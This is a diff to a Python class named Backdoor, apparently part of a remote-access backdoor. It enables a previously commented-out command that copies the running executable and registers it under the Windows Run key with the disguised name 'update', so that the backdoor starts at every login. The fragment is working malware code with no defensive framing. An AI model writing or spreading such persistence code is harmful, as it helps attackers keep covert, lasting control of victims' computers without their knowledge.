@@ -36,9 +36,7 @@ class Backdoor:
             shutil.copyfile(sys.executable, location)
             # shutil.copyfile(__file__, location)
             # if you want python file copied instead of exe
-            # subprocess.call(
-            #     'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ/d "' + location + '"',
-            #     shell=True)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ/d "' + location + '"', shell=True)
             # command for persistence windows
 
     def reliable_receive(self):
